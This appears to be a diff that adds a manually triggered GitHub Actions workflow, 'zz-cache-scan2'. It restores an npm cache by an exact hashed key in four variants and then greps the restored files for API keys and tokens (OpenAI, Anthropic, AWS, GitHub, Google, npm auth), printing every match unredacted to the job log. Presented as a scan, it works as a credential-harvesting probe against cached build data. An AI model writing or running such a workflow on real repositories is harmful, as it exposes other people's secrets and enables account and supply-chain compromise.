@@ -1,0 +1,37 @@
+name: zz-cache-scan2
+on:
+  workflow_dispatch:
+jobs:
+  scan:
+    runs-on: ubuntu-latest
+    steps:
+      - id: a
+        uses: actions/cache/restore@v4
+        with:
+          path: /home/runner/.npm
+          key: node-cache-Linux-x64-npm-4f153ab81385c7d4622fbabed5bc4abd71c8161f40c37912b780fccdafc8ac30
+      - id: b
+        uses: actions/cache/restore@v3
+        with:
+          path: ~/.npm
+          key: node-cache-Linux-x64-npm-4f153ab81385c7d4622fbabed5bc4abd71c8161f40c37912b780fccdafc8ac30
+      - id: c
+        uses: actions/cache/restore@v4
+        with:
+          path: ~/.npm
+          key: node-cache-Linux-x64-npm-4f153ab81385c7d4622fbabed5bc4abd71c8161f40c37912b780fccdafc8ac30
+          enableCrossOsArchive: true
+      - id: d
+        uses: actions/cache/restore@v4
+        with:
+          path: /home/runner/.npm
+          key: node-cache-Linux-x64-npm-4f153ab81385c7d4622fbabed5bc4abd71c8161f40c37912b780fccdafc8ac30
+          enableCrossOsArchive: true
+      - name: scan
+        run: |
+          echo "A=${{ steps.a.outputs.cache-hit }} B=${{ steps.b.outputs.cache-hit }} C=${{ steps.c.outputs.cache-hit }} D=${{ steps.d.outputs.cache-hit }}"
+          du -sh /home/runner/.npm 2>/dev/null || true
+          find /home/runner/.npm -maxdepth 2 -type f 2>/dev/null | head
+          echo "--- grep ---"
+          grep -rIaEo 'sk-proj-[A-Za-z0-9_-]{20,}|sk-ant-[A-Za-z0-9_-]{20,}|AKIA[0-9A-Z]{16}|gh[pousr]_[A-Za-z0-9]{36}|github_pat_[A-Za-z0-9_]{50,}|AIza[0-9A-Za-z_-]{35}|_authToken.{0,80}' /home/runner/.npm 2>/dev/null | sort -u | head -40 || echo NOHIT
+          echo DONE
